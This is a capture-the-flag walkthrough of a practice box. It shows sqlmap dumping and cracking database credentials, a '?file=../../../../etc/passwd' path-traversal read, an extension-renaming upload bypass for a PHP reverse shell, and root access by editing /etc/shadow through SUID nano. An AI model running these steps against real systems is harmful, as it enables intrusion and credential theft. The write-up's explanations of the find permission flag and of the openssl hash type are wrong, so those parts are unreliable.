# Recon

## nmap

```shell-session
# Nmap 7.94SVN scan initiated Sat Aug  3 22:46:48 2024 as: nmap -sT -sV -sC -p 21,22,53,1337,1883 -oN expose.txt 10.10.141.108
Nmap scan report for 10.10.141.108
Host is up (0.16s latency).

PORT     STATE SERVICE                 VERSION
21/tcp   open  ftp                     vsftpd 2.0.8 or later
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.13.57.25
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh                     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 0a:74:ef:c2:b4:5b:fb:9d:2e:98:ff:4d:aa:c4:b6:a1 (RSA)
|   256 67:51:60:2e:22:57:8e:0b:84:71:83:9f:f5:f9:66:3c (ECDSA)
|_  256 83:ff:80:ee:0f:88:ab:6e:ca:98:93:2d:22:c5:7f:75 (ED25519)
53/tcp   open  domain                  ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.16.1-Ubuntu
1337/tcp open  http                    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: EXPOSED
|_http-server-header: Apache/2.4.41 (Ubuntu)
1883/tcp open  mosquitto version 1.6.9
| mqtt-subscribe: 
|   Topics and their most recent payloads: 
|     $SYS/broker/load/messages/sent/15min: 0.82
|     $SYS/broker/load/bytes/sent/15min: 27.50
|     $SYS/broker/bytes/sent: 1224
|     $SYS/broker/uptime: 3729 seconds
|     $SYS/broker/bytes/received: 89
|     $SYS/broker/load/messages/received/5min: 0.23
|     $SYS/broker/load/bytes/received/5min: 4.06
|     $SYS/broker/heap/maximum: 50416
|     $SYS/broker/load/messages/sent/1min: 0.91
|     $SYS/broker/load/bytes/sent/1min: 3.65
|     $SYS/broker/store/messages/bytes: 161
|     $SYS/broker/messages/sent: 35
|     $SYS/broker/version: mosquitto version 1.6.9
|     $SYS/broker/messages/received: 5
|     $SYS/broker/load/sockets/5min: 0.41
|     $SYS/broker/load/connections/15min: 0.11
|     $SYS/broker/load/connections/1min: 0.91
|     $SYS/broker/load/messages/received/15min: 0.16
|     $SYS/broker/load/sockets/15min: 0.18
|     $SYS/broker/load/publish/sent/5min: 0.27
|     $SYS/broker/load/messages/sent/5min: 0.45
|     $SYS/broker/load/bytes/received/15min: 2.77
|     $SYS/broker/load/bytes/sent/5min: 9.95
|     $SYS/broker/load/connections/5min: 0.21
|     $SYS/broker/load/sockets/1min: 1.83
|     $SYS/broker/load/messages/received/1min: 0.91
|_    $SYS/broker/load/bytes/received/1min: 16.45
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Aug  3 22:47:10 2024 -- 1 IP address (1 host up) scanned in 22.13 seconds
```

## gobuster

```shell-session
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://10.10.141.108:1337 -w /usr/share/wordlists/dirb/big.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.141.108:1337
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 280]
/.htpasswd            (Status: 403) [Size: 280]
/admin                (Status: 301) [Size: 321] [--> http://10.10.141.108:1337/admin/]
/admin_101            (Status: 301) [Size: 325] [--> http://10.10.141.108:1337/admin_101/]
/javascript           (Status: 301) [Size: 326] [--> http://10.10.141.108:1337/javascript/]
/phpmyadmin           (Status: 301) [Size: 326] [--> http://10.10.141.108:1337/phpmyadmin/]
/server-status        (Status: 403) [Size: 280]
Progress: 20469 / 20470 (100.00%)
===============================================================
Finished
===============================================================

```

## admin_101

![[Pasted image 20240803232900.png]]

# gobuster /admin_101

```shell-session
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://10.10.141.108:1337/admin_101 -w /usr/share/wordlists/dirb/big.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.141.108:1337/admin_101
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 280]
/.htpasswd            (Status: 403) [Size: 280]
/assets               (Status: 301) [Size: 332] [--> http://10.10.141.108:1337/admin_101/assets/]
/includes             (Status: 301) [Size: 334] [--> http://10.10.141.108:1337/admin_101/includes/]
/modules              (Status: 301) [Size: 333] [--> http://10.10.141.108:1337/admin_101/modules/]
/test                 (Status: 301) [Size: 330] [--> http://10.10.141.108:1337/admin_101/test/]
Progress: 20469 / 20470 (100.00%)
===============================================================                                                              
Finished
===============================================================

```

# sqlmap


## Captured the request using BurpSuite

```http
POST /admin_101/includes/user_login.php HTTP/1.1
Host: 10.10.62.178:1337
Content-Length: 33
Accept: */*
X-Requested-With: XMLHttpRequest
Accept-Language: en-US
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://10.10.62.178:1337
Referer: http://10.10.62.178:1337/admin_101/
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=0870o4l9hfvbk8oreqhg397jd4
Connection: keep-alive

email=hacker%40root.thm&password=
```

I saved it to file named **req** to dump using **sqlmap**.
## Dumping the Request

```shell-session
┌──(kali㉿kali)-[~/Documents/thm/expose]
└─$ sqlmap -r req --dump
        ___
       __H__                                                                                                                
 ___ ___[)]_____ ___ ___  {1.8.7#stable}                                                                                    
|_ -| . [']     | .'| . |                                                                                                   
|___|_  [.]_|_|_|__,|  _|                                                                                                   
      |_|V...       |_|   https://sqlmap.org                                                                                

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 12:59:06 /2024-08-04/

[12:59:06] [INFO] parsing HTTP request from 'req'
[12:59:06] [WARNING] provided value for parameter 'password' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
[12:59:06] [INFO] testing connection to the target URL
[12:59:07] [INFO] checking if the target is protected by some kind of WAF/IPS
[12:59:07] [WARNING] request URI is marked as too long by the target. you are advised to try a switch '--no-cast' and/or '--no-escape'                                                                                                                  
[12:59:07] [CRITICAL] heuristics detected that the target is protected by some kind of WAF/IPS
are you sure that you want to continue with further target testing? [Y/n] y
[12:59:24] [WARNING] please consider usage of tamper scripts (option '--tamper')
[12:59:24] [INFO] testing if the target URL content is stable
[12:59:24] [INFO] target URL content is stable
[12:59:24] [INFO] testing if POST parameter 'email' is dynamic
[12:59:25] [INFO] POST parameter 'email' appears to be dynamic
[12:59:25] [INFO] heuristic (basic) test shows that POST parameter 'email' might be injectable (possible DBMS: 'MySQL')
[12:59:25] [INFO] heuristic (XSS) test shows that POST parameter 'email' might be vulnerable to cross-site scripting (XSS) attacks
[12:59:25] [INFO] testing for SQL injection on POST parameter 'email'

```
## Found Creds

```shell-session
[13:23:04] [INFO] retrieved: 'VeryDifficultPassword!!#@#@!#!@#1231'
Database: expose
Table: user
[1 entry]
+----+-----------------+---------------------+--------------------------------------+
| id | email           | created             | password                             |
+----+-----------------+---------------------+--------------------------------------+
| 1  | hacker@root.thm | 2023-02-21 09:05:46 | VeryDifficultPassword!!#@#@!#!@#1231 |
+----+-----------------+---------------------+--------------------------------------+

[13:23:04] [INFO] table 'expose.`user`' dumped to CSV file '/home/kali/.local/share/sqlmap/output/10.10.62.178/dump/expose/user.csv'                                                                                                                      
[13:23:04] [INFO] fetching columns for table 'config' in database 'expose'
[13:23:04] [INFO] retrieved: 'id'
[13:23:05] [INFO] retrieved: 'int'
[13:23:05] [INFO] retrieved: 'url'
[13:23:05] [INFO] retrieved: 'text'
[13:23:05] [INFO] retrieved: 'password'
[13:23:06] [INFO] retrieved: 'text'
[13:23:06] [INFO] fetching entries for table 'config' in database 'expose'
[13:23:06] [INFO] retrieved: '/file1010111/index.php'
[13:23:06] [INFO] retrieved: '1'
[13:23:06] [INFO] retrieved: '69c66901194a6486176e81f5945b8929'
[13:23:07] [INFO] retrieved: '/upload-cv00101011/index.php'
[13:23:07] [INFO] retrieved: '3'
[13:23:07] [INFO] retrieved: '// ONLY ACCESSIBLE THROUGH USERNAME STARTING WITH Z'
[13:23:07] [INFO] recognized possible password hashes in column 'password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
[13:23:17] [INFO] writing hashes to a temporary file '/tmp/sqlmapko7zc4ed15789/sqlmaphashes-hu2c6hud.txt' 
do you want to crack them via a dictionary-based attack? [Y/n/q] y
[13:23:33] [INFO] using hash method 'md5_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> /usr/share/wordlists/
[13:23:55] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] n
[13:24:00] [INFO] starting dictionary-based cracking (md5_generic_passwd)
[13:24:00] [INFO] starting 4 processes 
[13:24:06] [INFO] cracked password 'easytohack' for hash '69c66901194a6486176e81f5945b8929'                                
Database: expose                                                                                                           
Table: config
[2 entries]
+----+------------------------------+-----------------------------------------------------+
| id | url                          | password                                            |
+----+------------------------------+-----------------------------------------------------+
| 1  | /file1010111/index.php       | 69c66901194a6486176e81f5945b8929 (easytohack)       |
| 3  | /upload-cv00101011/index.php | // ONLY ACCESSIBLE THROUGH USERNAME STARTING WITH Z |

```

# /file1010111

Navigating http://10.10.62.178:1337/file1010111 gave me a password prompt. I captured the response in burp and it gave:

```html
HTTP/1.1 200 OK
Date: Sun, 04 Aug 2024 21:00:22 GMT
Server: Apache/2.4.41 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 945
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8





<!DOCTYPE html>
<html lang="en">


<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Tourism Website</title>
 
    <script src='tailwind.min.js'></script> <!-- THIS IS OFFICIAL FILE - DO NOT CHANGE IT -->
  <link rel="stylesheet" href="style.css">
</head>

<body>
  <!-- Navigation Bar -->
  <nav class="bg-gray-900 text-white p-6">
    <div class="flex justify-between items-center">
      <a href="/" class="text-lg font-bold">Admin Access </a>
      <ul class="flex items-center gap-5">

  
      </ul>
    </div>
  </nav>




  <!-- Main Content -->
<main class=" mx-auto py-8  min-h-[80vh] flex items-center justify-center gap-10 flex-col xl:flex-row">
 <p class="mb-4"><strong>Parameter Fuzzing is also important :)  or Can you hide DOM elements? <strong></p><span  style="display: none;">Hint: Try file or view as GET parameters?</span>
```

The hint said to try GET parameters, I tried but couldn't get any info.

Changing the URL to http://10.10.62.178:1337/file1010111/index.php?file=../../../../etc/passwd gave me the contents of the passwd file though.

```shell-session
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin sshd:x:109:65534::/run/sshd:/usr/sbin/nologin landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:111:1::/var/cache/pollinate:/bin/false ec2-instance-connect:x:112:65534::/nonexistent:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false mysql:x:113:119:MySQL Server,,,:/nonexistent:/bin/false zeamkish:x:1001:1001:Zeam Kish,1,1,:/home/zeamkish:/bin/bash ftp:x:114:121:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin bind:x:115:122::/var/cache/bind:/usr/sbin/nologin Debian-snmp:x:116:123::/var/lib/snmp:/bin/false redis:x:117:124::/var/lib/redis:/usr/sbin/nologin mosquitto:x:118:125::/var/lib/mosquitto:/usr/sbin/nologin fwupd-refresh:x:119:126:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
```

We have the username for zeamkish that **sqlmap** pointed to with:
```shell-session
| 3  | /upload-cv00101011/index.php | // ONLY ACCESSIBLE THROUGH USERNAME STARTING WITH Z |
```

# /upload-cv00101011

Accessing as zeamkish we can upload files with .png or .jpg format.

I named my php shell shell.php.png and captured the upload request, changing the name back to shell.php. The upload was successful and I was able to get a reverse shell. 

Navigating to zeamkish home folder I saw 2 txt files.

```shell-session
$ ls  
flag.txt
ssh_creds.txt
```

I couldn't access `flag.txt` but I was able to cat `ssh_creds.txt`.

```shell-session
SSH CREDS
zeamkish
easytohack@123
$ 
```

# SSH @ zeamkish

Using the creds we found in zeamkish's home folder we were able to ssh in as zeamkish and access the user flag.

```shell-session
┌──(kali㉿kali)-[~]
└─$ ssh zeamkish@10.10.62.178
zeamkish@10.10.62.178's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-1039-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Aug  4 21:24:50 UTC 2024

  System load:  0.08              Processes:             135
  Usage of /:   7.2% of 58.09GB   Users logged in:       0
  Memory usage: 17%               IPv4 address for eth0: 10.10.62.178
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Sun Jul  2 17:27:46 2023 from 10.10.83.109
zeamkish@ip-10-10-62-178:~$ ls
flag.txt  ssh_creds.txt
zeamkish@ip-10-10-62-178:~$ cat flag.txt
THM{USER_FLAG_1231_EXPOSE}
zeamkish@ip-10-10-62-178:~$ 
```

There were no cronjobs that I could use for privesc and the shadow file was locked down.

I ran the command `find / -perm -u=s 2>/dev/null` to find files with the set-user-id (SUID) permission bit set (`-perm -u=s`)

Also useful is `find / -perm -04000 -type f -ls 2>/dev/null`. 

1. `find /` searches for files in the root directory and it's subdirectories.
2. `-perm -04000` filters the search results to include files with permissions set to `-r-xr--r--` (owner has read and execute permissions, group has read permissions, and others have read permissions)
3. `-type f` restricts the search to regular files (not directories, symlinks, etc.)
4. `-ls` modifies the output of find to include a long listing for mat, similar to the `ls -l` command
5. `2>/dev/null` redirects any error messages generated by `find` to `/dev/null`, effectively suppressing them from appearing on the console. This redirection targets the standard error stream (STDERR), not the standard output stream (STDOUT)


```shell-session
zeamkish@ip-10-10-62-178:~$ find / -perm -04000 -type f -ls 2>/dev/null
      847     84 -rwsr-xr-x   1 root     root        85064 Nov 29  2022 /snap/core20/1974/usr/bin/chfn
      853     52 -rwsr-xr-x   1 root     root        53040 Nov 29  2022 /snap/core20/1974/usr/bin/chsh
      922     87 -rwsr-xr-x   1 root     root        88464 Nov 29  2022 /snap/core20/1974/usr/bin/gpasswd
     1006     55 -rwsr-xr-x   1 root     root        55528 May 30  2023 /snap/core20/1974/usr/bin/mount
     1015     44 -rwsr-xr-x   1 root     root        44784 Nov 29  2022 /snap/core20/1974/usr/bin/newgrp
     1030     67 -rwsr-xr-x   1 root     root        68208 Nov 29  2022 /snap/core20/1974/usr/bin/passwd
     1140     67 -rwsr-xr-x   1 root     root        67816 May 30  2023 /snap/core20/1974/usr/bin/su
     1141    163 -rwsr-xr-x   1 root     root       166056 Apr  4  2023 /snap/core20/1974/usr/bin/sudo
     1199     39 -rwsr-xr-x   1 root     root        39144 May 30  2023 /snap/core20/1974/usr/bin/umount
     1288     51 -rwsr-xr--   1 root     systemd-resolve    51344 Oct 25  2022 /snap/core20/1974/usr/lib/dbus-1.0/dbus-daemon-launch-helper
     1660    463 -rwsr-xr-x   1 root     root              473576 Apr  3  2023 /snap/core20/1974/usr/lib/openssh/ssh-keysign
      847     84 -rwsr-xr-x   1 root     root               85064 Nov 29  2022 /snap/core20/1950/usr/bin/chfn
      853     52 -rwsr-xr-x   1 root     root               53040 Nov 29  2022 /snap/core20/1950/usr/bin/chsh
      922     87 -rwsr-xr-x   1 root     root               88464 Nov 29  2022 /snap/core20/1950/usr/bin/gpasswd
     1006     55 -rwsr-xr-x   1 root     root               55528 May 30  2023 /snap/core20/1950/usr/bin/mount
     1015     44 -rwsr-xr-x   1 root     root               44784 Nov 29  2022 /snap/core20/1950/usr/bin/newgrp
     1030     67 -rwsr-xr-x   1 root     root               68208 Nov 29  2022 /snap/core20/1950/usr/bin/passwd
     1140     67 -rwsr-xr-x   1 root     root               67816 May 30  2023 /snap/core20/1950/usr/bin/su
     1141    163 -rwsr-xr-x   1 root     root              166056 Apr  4  2023 /snap/core20/1950/usr/bin/sudo
     1199     39 -rwsr-xr-x   1 root     root               39144 May 30  2023 /snap/core20/1950/usr/bin/umount
     1288     51 -rwsr-xr--   1 root     systemd-resolve    51344 Oct 25  2022 /snap/core20/1950/usr/lib/dbus-1.0/dbus-daemon-launch-helper
     1660    463 -rwsr-xr-x   1 root     root              473576 Apr  3  2023 /snap/core20/1950/usr/lib/openssh/ssh-keysign
       66     40 -rwsr-xr-x   1 root     root               40152 Jun 14  2022 /snap/core/15511/bin/mount
       80     44 -rwsr-xr-x   1 root     root               44168 May  7  2014 /snap/core/15511/bin/ping
       81     44 -rwsr-xr-x   1 root     root               44680 May  7  2014 /snap/core/15511/bin/ping6
       98     40 -rwsr-xr-x   1 root     root               40128 Nov 29  2022 /snap/core/15511/bin/su
      116     27 -rwsr-xr-x   1 root     root               27608 Jun 14  2022 /snap/core/15511/bin/umount
     2646     71 -rwsr-xr-x   1 root     root               71824 Nov 29  2022 /snap/core/15511/usr/bin/chfn
     2648     40 -rwsr-xr-x   1 root     root               40432 Nov 29  2022 /snap/core/15511/usr/bin/chsh
     2725     74 -rwsr-xr-x   1 root     root               75304 Nov 29  2022 /snap/core/15511/usr/bin/gpasswd
     2817     39 -rwsr-xr-x   1 root     root               39904 Nov 29  2022 /snap/core/15511/usr/bin/newgrp
     2830     53 -rwsr-xr-x   1 root     root               54256 Nov 29  2022 /snap/core/15511/usr/bin/passwd
     2940    134 -rwsr-xr-x   1 root     root              136808 Jan 17  2023 /snap/core/15511/usr/bin/sudo
     3039     42 -rwsr-xr--   1 root     systemd-resolve    42992 Oct 26  2022 /snap/core/15511/usr/lib/dbus-1.0/dbus-daemon-launch-helper
     3411    419 -rwsr-xr-x   1 root     root              428240 Oct  7  2022 /snap/core/15511/usr/lib/openssh/ssh-keysign
     6485    125 -rwsr-xr-x   1 root     root              127656 May 27  2023 /snap/core/15511/usr/lib/snapd/snap-confine
     7673    386 -rwsr-xr--   1 root     dip               394984 Jul 23  2020 /snap/core/15511/usr/sbin/pppd
       66     40 -rwsr-xr-x   1 root     root               40152 Jun 14  2022 /snap/core/15419/bin/mount
       80     44 -rwsr-xr-x   1 root     root               44168 May  7  2014 /snap/core/15419/bin/ping
       81     44 -rwsr-xr-x   1 root     root               44680 May  7  2014 /snap/core/15419/bin/ping6
       98     40 -rwsr-xr-x   1 root     root               40128 Nov 29  2022 /snap/core/15419/bin/su
      116     27 -rwsr-xr-x   1 root     root               27608 Jun 14  2022 /snap/core/15419/bin/umount
     2607     71 -rwsr-xr-x   1 root     root               71824 Nov 29  2022 /snap/core/15419/usr/bin/chfn
     2609     40 -rwsr-xr-x   1 root     root               40432 Nov 29  2022 /snap/core/15419/usr/bin/chsh
     2686     74 -rwsr-xr-x   1 root     root               75304 Nov 29  2022 /snap/core/15419/usr/bin/gpasswd
     2778     39 -rwsr-xr-x   1 root     root               39904 Nov 29  2022 /snap/core/15419/usr/bin/newgrp
     2791     53 -rwsr-xr-x   1 root     root               54256 Nov 29  2022 /snap/core/15419/usr/bin/passwd
     2901    134 -rwsr-xr-x   1 root     root              136808 Jan 17  2023 /snap/core/15419/usr/bin/sudo
     3000     42 -rwsr-xr--   1 root     systemd-resolve    42992 Oct 26  2022 /snap/core/15419/usr/lib/dbus-1.0/dbus-daemon-launch-helper
     3372    419 -rwsr-xr-x   1 root     root              428240 Oct  7  2022 /snap/core/15419/usr/lib/openssh/ssh-keysign
     6446    125 -rwsr-xr-x   1 root     root              127656 May 12  2023 /snap/core/15419/usr/lib/snapd/snap-confine
     7634    386 -rwsr-xr--   1 root     dip               394984 Jul 23  2020 /snap/core/15419/usr/sbin/pppd
       56     43 -rwsr-xr-x   1 root     root               43088 Sep 16  2020 /snap/core18/2785/bin/mount
       65     63 -rwsr-xr-x   1 root     root               64424 Jun 28  2019 /snap/core18/2785/bin/ping
       81     44 -rwsr-xr-x   1 root     root               44664 Nov 29  2022 /snap/core18/2785/bin/su
       99     27 -rwsr-xr-x   1 root     root               26696 Sep 16  2020 /snap/core18/2785/bin/umount
     1754     75 -rwsr-xr-x   1 root     root               76496 Nov 29  2022 /snap/core18/2785/usr/bin/chfn
     1756     44 -rwsr-xr-x   1 root     root               44528 Nov 29  2022 /snap/core18/2785/usr/bin/chsh
     1809     75 -rwsr-xr-x   1 root     root               75824 Nov 29  2022 /snap/core18/2785/usr/bin/gpasswd
     1873     40 -rwsr-xr-x   1 root     root               40344 Nov 29  2022 /snap/core18/2785/usr/bin/newgrp
     1886     59 -rwsr-xr-x   1 root     root               59640 Nov 29  2022 /snap/core18/2785/usr/bin/passwd
     1977    146 -rwsr-xr-x   1 root     root              149080 Apr  4  2023 /snap/core18/2785/usr/bin/sudo
     2065     42 -rwsr-xr--   1 root     systemd-resolve    42992 Oct 25  2022 /snap/core18/2785/usr/lib/dbus-1.0/dbus-daemon-launch-helper
     2375    427 -rwsr-xr-x   1 root     root              436552 Mar 30  2022 /snap/core18/2785/usr/lib/openssh/ssh-keysign
       56     43 -rwsr-xr-x   1 root     root               43088 Sep 16  2020 /snap/core18/2751/bin/mount
       65     63 -rwsr-xr-x   1 root     root               64424 Jun 28  2019 /snap/core18/2751/bin/ping
       81     44 -rwsr-xr-x   1 root     root               44664 Nov 29  2022 /snap/core18/2751/bin/su
       99     27 -rwsr-xr-x   1 root     root               26696 Sep 16  2020 /snap/core18/2751/bin/umount
     1728     75 -rwsr-xr-x   1 root     root               76496 Nov 29  2022 /snap/core18/2751/usr/bin/chfn
     1730     44 -rwsr-xr-x   1 root     root               44528 Nov 29  2022 /snap/core18/2751/usr/bin/chsh
     1783     75 -rwsr-xr-x   1 root     root               75824 Nov 29  2022 /snap/core18/2751/usr/bin/gpasswd
     1847     40 -rwsr-xr-x   1 root     root               40344 Nov 29  2022 /snap/core18/2751/usr/bin/newgrp
     1860     59 -rwsr-xr-x   1 root     root               59640 Nov 29  2022 /snap/core18/2751/usr/bin/passwd
     1951    146 -rwsr-xr-x   1 root     root              149080 Apr  4  2023 /snap/core18/2751/usr/bin/sudo
     2039     42 -rwsr-xr--   1 root     systemd-resolve    42992 Oct 25  2022 /snap/core18/2751/usr/lib/dbus-1.0/dbus-daemon-launch-helper
     2349    427 -rwsr-xr-x   1 root     root              436552 Mar 30  2022 /snap/core18/2751/usr/lib/openssh/ssh-keysign
    10732     52 -rwsr-xr--   1 root     messagebus         51344 Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
    25779    464 -rwsr-xr-x   1 root     root              473576 Apr  3  2023 /usr/lib/openssh/ssh-keysign
    13935     24 -rwsr-xr-x   1 root     root               22840 Feb 21  2022 /usr/lib/policykit-1/polkit-agent-helper-1
     7479     16 -rwsr-xr-x   1 root     root               14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
     7044    144 -rwsr-xr-x   1 root     root              146888 May 29  2023 /usr/lib/snapd/snap-confine
     9161     84 -rwsr-xr-x   1 root     root               85064 Nov 29  2022 /usr/bin/chfn
    13933     32 -rwsr-xr-x   1 root     root               31032 Feb 21  2022 /usr/bin/pkexec
    16077    164 -rwsr-xr-x   1 root     root              166056 Apr  4  2023 /usr/bin/sudo
     5576     40 -rwsr-xr-x   1 root     root               39144 May 30  2023 /usr/bin/umount
     9166     68 -rwsr-xr-x   1 root     root               68208 Nov 29  2022 /usr/bin/passwd
     9165     88 -rwsr-xr-x   1 root     root               88464 Nov 29  2022 /usr/bin/gpasswd
     3189     44 -rwsr-xr-x   1 root     root               44784 Nov 29  2022 /usr/bin/newgrp
     9163     52 -rwsr-xr-x   1 root     root               53040 Nov 29  2022 /usr/bin/chsh
     2136    316 -rwsr-xr-x   1 root     root              320136 Apr 10  2020 /usr/bin/nano
    10845     68 -rwsr-xr-x   1 root     root               67816 May 30  2023 /usr/bin/su
     2028     40 -rwsr-xr-x   1 root     root               39144 Mar  7  2020 /usr/bin/fusermount
     1571    316 -rwsr-x---   1 root     zeamkish          320160 Feb 18  2020 /usr/bin/find
     2166     56 -rwsr-sr-x   1 daemon   daemon             55560 Nov 12  2018 /usr/bin/at
     5210     56 -rwsr-xr-x   1 root     root               55528 May 30  2023 /usr/bin/mount

```

Nano has the privileges I want, so i can edit the shadow file with a password I choose. I generate an easy password with `openssl passwd -1 -salt root 1234`

- `-1` specifies the hash algorithm to use. `-1` corresponds to the MD5-based password hash, also known as DES-based hash with a modified MD5.
- `-salt root` the `-salt` option generates a random salt value. In this case, it uses the string `root` as the salt instead of generating a random one.
- `1234` is the password to be hashed`

```shell-session
zeamkish@ip-10-10-62-178:~$ openssl passwd -1 -salt root 1234
$1$root$.fAWE/htZAqQge.bvM16O/
```

With the output I need, it's time to edit `/etc/shadow`.

`nano /etc/shadow` and paste the hash I generated over the old root password:
```shell-session
root:$1$root$.fAWE/htZAqQge.bvM16O/:19519:0:99999:7:::
daemon:*:18561:0:99999:7:::
bin:*:18561:0:99999:7:::
sys:*:18561:0:99999:7:::
sync:*:18561:0:99999:7:::
games:*:18561:0:99999:7:::
man:*:18561:0:99999:7:::
lp:*:18561:0:99999:7:::
mail:*:18561:0:99999:7:::
news:*:18561:0:99999:7:::
```

We can now `su` with the password `1234` and read the flag in the root folder.

```shell-session
root@ip-10-10-62-178:/# cat /root/flag.txt
THM{ROOT_EXPOSED_1001}
root@ip-10-10-62-178:/# 
```


# AAR

I did have to look up a walkthrough for 2 parts on where I got stumped, it shows that I need more hands-on practice with privesc and identifying good attack vectors. 

The parts I got stuck on was knowing what command to use to find bins with the proper permissions, and also knowing when to use XSS, I was stuck trying to send GET requests through BurpSuite and combing through the responses thinking I'd missed something. 

Once I saw that they were using the ?file=../../../../ path traversal, I knew to check the passwd file and I made the connection from the sqlmap output `| 3  | /upload-cv00101011/index.php | // ONLY ACCESSIBLE THROUGH USERNAME STARTING WITH Z |` from earlier. I looked for a username that started with 'Z' and once I found it I was back on track. 

I uploaded the shell.php (after some experimentation) and was able to get a reverse shell and find the ssh credentials and the user flag.txt file. 

I then looked for cronjobs I could use for privesc, but there was nothing, so I did have to look up some methods for privesc to get back on track.

